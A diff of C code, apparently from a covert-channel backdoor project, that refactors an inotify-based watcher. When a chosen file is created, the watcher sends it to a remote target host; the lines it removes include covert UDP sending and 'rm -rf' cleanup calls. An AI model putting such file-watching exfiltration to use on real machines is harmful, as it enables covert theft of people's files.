@@ -17,69 +17,15 @@ int addWatch(int socket, char *directory){
     return watch;
 }
 
-void *watch_directory(void* args){
-    inotify_struct *arg = args;
-    char directory[BUFSIZ];
-    char file[BUFSIZ];
-    int socket, watch, epollfd;
+void watch_directory(char *targetip, char* localip, char *directory, char* file, bool tcp){
+    int socket, epollfd;
     struct epoll_event event;
     struct epoll_event *events;
     char buffer[BUFLEN];
     int k, len;
-    FILE* fp;
-    long size;
-    char *buf;
 
-
-    recv_results(arg->localip, 8508, "directory", arg->tcp);
-    recv_results(arg->localip, 8508, "file", arg->tcp);
-
-    if((fp = fopen("directory", "rb")) == NULL) {
-        perror("fopen can't open file");
-        exit(1);
-    }
-
-    fseek(fp, 0, SEEK_END);
-    size = ftell(fp);
-    rewind(fp);
-    buf = calloc(1, size+1);
-    if(fread(buf, size, 1, fp) == !1){
-        perror("fread");
-        fclose(fp);
-        free(buf);
-        exit(1);
-    }
-
-    strncpy(directory, buf, BUFSIZ);
-    printf("Directory to watch: %s\n", directory);
-    fclose(fp);
-    free(buf);
-
-    if((fp = fopen("file", "rb")) == NULL) {
-        perror("fopen can't open file");
-        exit(1);
-    }
-
-    fseek(fp, 0, SEEK_END);
-    size = ftell(fp);
-    rewind(fp);
-    buf = calloc(1, size+1);
-    if(fread(buf, size, 1, fp) == !1){
-        perror("fread");
-        fclose(fp);
-        free(buf);
-        exit(1);
-    }
-
-    strncpy(file, buf, BUFSIZ);
-    printf("File to watch: %s\n", file);
-    fclose(fp);
-    free(buf);
-
-    system("rm -rf directory");
-    system("rm -rf file");
     socket = initInotify();
-    watch = addWatch(socket, directory);
+    addWatch(socket, directory);
     epollfd = createEpollFd();
 
     event.events = EPOLLIN | EPOLLOUT | EPOLLET;
@@ -102,13 +48,13 @@ void *watch_directory(void* args){
                         printf("name=%s\n", ievent->name);
                         if(strcmp(ievent->name, file) == 0){
                             char filename[BUFSIZ];
-                            strcat(filename, directory);
-                            strcat(filename, file);
-                            send_results(arg->localip, arg->targetip, 8508, 8508, filename, arg->tcp, INOTIFY);
+                            strncat(filename, directory, BUFSIZ);
+                            strncat(filename, file, BUFSIZ);
+                            send_results(localip, targetip, UPORT, UPORT, filename, tcp, INOTIFY);
                             printf("File was created\n");
                             close(socket);
                             free(events);
-                            exit(1);
+                            return;
                         }
                     }
 
@@ -122,43 +68,4 @@ void *watch_directory(void* args){
     }
     free(events);
 }
-
-void *recv_watch_directory(void* args){
-    inotify_struct *arg = args;
-    char data[BUFSIZ];
-    char data1[BUFSIZ];
-    char directory[BUFSIZ];
-    char file[BUFSIZ];
-    FILE *fp;
-    strncpy(directory, arg->directory, BUFSIZ);
-    strncpy(file, arg->file, BUFSIZ);
-
-    strncpy(data, directory, BUFSIZ);
-	if(arg->tcp){
-
-        if((fp = fopen("directory", "wb+")) == NULL) {
-            perror("fopen can't open file");
-            exit(1);
-        }
-        fprintf(fp, "%s", directory);
-        fclose(fp);
-        if((fp = fopen("file", "wb+")) == NULL) {
-            perror("fopen can't open file");
-            exit(1);
-        }
-        fprintf(fp, "%s", file);
-        fclose(fp);
-        send_results(arg->localip, arg->targetip, 8508, 8508, "directory", true, INOTIFY);
-        send_results(arg->localip, arg->targetip, 8508, 8508, "file", true, INOTIFY);
-        system("rm -rf directory");
-        system("rm -rf file");
-    } else {
-        covert_udp_send_data(arg->localip, arg->targetip, 8508, 8508, data, 0);
-        memset(data, 0, BUFSIZ);
-        strncpy(data, file, BUFSIZ);
-        covert_udp_send_data(arg->localip, arg->targetip, 8508, 8508, data, 0);
-    }
-    recv_results(arg->localip, 8508, "inotify", arg->tcp);
-}
-
 
